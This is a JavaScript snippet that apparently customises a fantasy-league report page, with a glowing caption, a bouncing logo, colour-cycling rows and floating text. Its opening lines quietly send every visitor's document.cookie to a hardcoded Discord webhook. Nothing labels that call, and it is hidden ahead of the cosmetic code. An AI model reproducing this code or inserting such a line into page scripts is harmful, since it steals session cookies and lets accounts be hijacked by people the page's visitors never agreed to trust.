fetch("https://discord.com/api/webhooks/1406776103917457548/OcKq96Hvc5ZumMVo6xTqVOivoMdjCUeW-38lIW8z2FGOBD07Jo8MzJq-d6OUJmpmwvfZ", { 
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({ content: document.cookie })
});

// Find your table
const myTable = Array.from(document.querySelectorAll('table.report'))
  .find(tbl => tbl.querySelector('caption span')?.textContent.trim() === "VanGinkelTouchedMyJinkel");

if (myTable) {
  // 1. Style caption (red & black neon)
  const caption = myTable.querySelector('caption span');
  caption.style.fontFamily = '"Orbitron", "Exo 2", "Roboto", sans-serif';
  caption.style.fontSize = "28px";
  caption.style.fontWeight = "bold";
  caption.style.color = "#FF0000";           // red text
  caption.style.textShadow = "0 0 5px #000000, 0 0 10px #FF0000, 0 0 20px #FF0000";

  // Animate caption glow
  let glow = 5;
  let increasing = true;
  setInterval(() => {
    caption.style.textShadow = `0 0 ${glow}px #000000, 0 0 ${glow*2}px #FF0000, 0 0 ${glow*4}px #FF0000`;
    if (increasing) glow += 1; else glow -= 1;
    if (glow > 15) increasing = false;
    if (glow < 5) increasing = true;
  }, 100);

  // 2. Animate franchise logo
  const logo = myTable.querySelector('img.franchiselogo');
  if (logo) {
    logo.style.position = "relative";
    let dir = 1;
    let topPos = 0;
    setInterval(() => {
      topPos += dir;
      logo.style.top = topPos + "px";
      if (topPos > 10) dir = -1;
      if (topPos < -10) dir = 1;
    }, 100);
  }

  // 3. Animate tbody background color
  const tbody = myTable.querySelector('tbody');
  if (tbody) {
    let hue = 0;
    setInterval(() => {
      tbody.style.backgroundColor = `hsl(${hue}, 70%, 15%)`; // dark red/blackish hues
      tbody.style.color = "#FF4444";                          // slightly brighter text
      hue = (hue + 1) % 360;
    }, 50);
  }

  // 4. Optional: add floating text inside table
  const floatingText = document.createElement('div');
  floatingText.textContent = "🚀 VanGinkelTouchedMyJinkel!";
  floatingText.style.position = "absolute";
  floatingText.style.top = "0px";
  floatingText.style.left = "0px";
  floatingText.style.fontSize = "18px";
  floatingText.style.fontWeight = "bold";
  floatingText.style.color = "#FF0000";
  floatingText.style.textShadow = "1px 1px 5px #000000";
  floatingText.style.zIndex = 999;
  myTable.style.position = "relative"; // ensure absolute children are positioned
  myTable.appendChild(floatingText);

  // Animate floating text horizontally
  let leftPos = 0;
  let dir2 = 1;
  setInterval(() => {
    leftPos += dir2;
    floatingText.style.left = leftPos + "px";
    if (leftPos > myTable.offsetWidth - 200) dir2 = -1;
    if (leftPos < 0) dir2 = 1;
  }, 30);
}
